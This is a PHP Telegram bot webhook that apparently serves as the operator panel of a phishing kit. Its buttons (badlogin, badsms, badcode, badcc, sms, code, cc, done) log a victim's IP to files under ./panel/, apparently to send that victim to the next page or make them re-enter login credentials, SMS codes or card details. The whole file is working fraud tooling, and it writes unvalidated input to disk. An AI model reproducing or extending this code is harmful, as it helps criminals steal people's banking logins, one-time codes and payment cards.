<?php

require_once 'app.php';
require_once 'data.php';

$bot = 'https://api.telegram.org/bot'.TLGBOT;

$update = json_decode(file_get_contents('php://input'), true);
$chatId = $update['message']['chat']['id'];
$message = $update['message']['text'];
$query = $update['callback_query']['data'];
$callback_id = $update['callback_query']['id'];


if (strpos($query, 'badlogin') === 0) {
    $ip = substr($query, 8);
    $file = fopen('./panel/badlogin.txt', 'a');
    fwrite($file, $ip . "\n");
    file_get_contents($bot."/answerCallbackQuery?callback_query_id=".$callback_id."&text=DONE");
    
}

if (strpos($query, 'badsms') === 0) {
    $ip = substr($query, 6);
    $file = fopen('./panel/badsms.txt', 'a');
    fwrite($file, $ip . "\n");
    file_get_contents($bot."/answerCallbackQuery?callback_query_id=".$callback_id."&text=DONE");
    
}
if (strpos($query, 'badcode') === 0) {
    $ip = substr($query, 7);
    $file = fopen('./panel/badcode.txt', 'a');
    fwrite($file, $ip . "\n");
    file_get_contents($bot."/answerCallbackQuery?callback_query_id=".$callback_id."&text=DONE");
    
}
if (strpos($query, 'badcc') === 0) {
    $ip = substr($query, 5);
    $file = fopen('./panel/badcc.txt', 'a');
    fwrite($file, $ip . "\n");
    file_get_contents($bot."/answerCallbackQuery?callback_query_id=".$callback_id."&text=DONE");
    
}

if (strpos($query, 'sms') === 0) {
    $ip = substr($query, 3);
    $file = fopen('./panel/sms.txt', 'a');
    fwrite($file, $ip . "\n");
    file_get_contents($bot."/answerCallbackQuery?callback_query_id=".$callback_id."&text=DONE");
    
}
if (strpos($query, 'code') === 0) {
    $ip = substr($query, 4);
    $file = fopen('./panel/code.txt', 'a');
    fwrite($file, $ip . "\n");
    file_get_contents($bot."/answerCallbackQuery?callback_query_id=".$callback_id."&text=DONE");
    
}
if (strpos($query, 'cc') === 0) {
    $ip = substr($query, 2);
    $file = fopen('./panel/cc.txt', 'a');
    fwrite($file, $ip . "\n");
    file_get_contents($bot."/answerCallbackQuery?callback_query_id=".$callback_id."&text=DONE");
    
}
if (strpos($query, 'done') === 0) {
    $ip = substr($query, 4);
    $file = fopen('./panel/done.txt', 'a');
    fwrite($file, $ip . "\n");
    file_get_contents($bot."/answerCallbackQuery?callback_query_id=".$callback_id."&text=DONE");
    
}

if (strpos($message, '/begin') === 0) {
    
    telegram_message('WELCOME', null);
}

